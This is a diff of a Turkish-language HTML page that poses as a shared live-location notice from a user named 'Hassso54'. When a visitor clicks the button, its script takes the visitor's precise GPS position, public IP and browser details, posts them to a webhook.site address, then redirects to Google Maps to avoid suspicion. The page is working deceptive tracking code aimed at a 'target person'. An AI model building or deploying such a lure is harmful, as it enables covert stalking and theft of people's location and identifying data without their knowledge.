@@ -1,60 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Yükleniyor...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canlı Konum Takibi</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #2c2c2c; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h2 { margin-bottom: 10px; font-size: 18px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        button { background-color: #007bff; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        button:hover { background-color: #0056b3; }
+        #loading { display: none; margin-top: 15px; font-style: italic; color: #ffc107; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p style="margin-left: 10px;">Lütfen bekleyiniz...</p>
 
-    <script>
-        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
+<div class="card">
+    <div class="icon">📍</div>
+    <h2>Canlı Konum Paylaşımı</h2>
+    <p><b>Hassso54</b> sizinle canlı konumunu paylaştı. Haritada görüntülemek için aşağıdaki butona tıklayın.</p>
+    <button onclick="konumuAl()">Hassso54 Konumunu Gör</button>
+    <div id="loading">Bağlantı kuruluyor, lütfen bekleyin...</div>
+</div>
 
-        async function baslat() {
-            let ip = "Bilinmiyor";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch (e) { console.log("IP alınamadı"); }
+<script>
+    // KENDİ WEBHOOK LİNKİNİ BURAYA YAPIŞTIR
+    const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
-            if (navigator.geolocation) {
-                // Konum sorma işlemi burada başlıyor
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const harita = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        veriyiGonder(ip, harita);
-                    },
-                    (err) => {
-                        veriyiGonder(ip, "İzin Reddedildi: " + err.message);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                veriyiGonder(ip, "Tarayıcı desteklemiyor");
-            }
+    function konumuAl() {
+        document.getElementById('loading').style.display = 'block';
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const haritaLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    veriyiGonder(haritaLink);
+                },
+                (err) => {
+                    // İzin vermezse en azından IP'yi gönder
+                    veriyiGonder("Kullanıcı İzin Vermedi (Sadece IP)");
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        } else {
+            veriyiGonder("GPS Desteklenmiyor");
         }
+    }
 
-        function veriyiGonder(ip, konum) {
-            fetch(webhookURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ ip: ip, konum: konum, cihaz: navigator.userAgent })
-            }).then(() => {
-                // Veri gittikten 1 saniye sonra yönlendir
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 1000);
+    function veriyiGonder(konumMesaji) {
+        // IP Adresini çekip her şeyi Webhook'a yolla
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        hedef_kisi: "Hassso54 Takibi",
+                        ip: data.ip,
+                        konum_bilgisi: konumMesaji,
+                        cihaz: navigator.userAgent
+                    })
+                }).then(() => {
+                    // İşlem bitince şüphe çekmemek için gerçek bir haritaya yönlendir
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com/maps";
+                    }, 1500);
+                });
             });
-        }
+    }
+</script>
 
-        baslat();
-    </script>
 </body>
 </html>
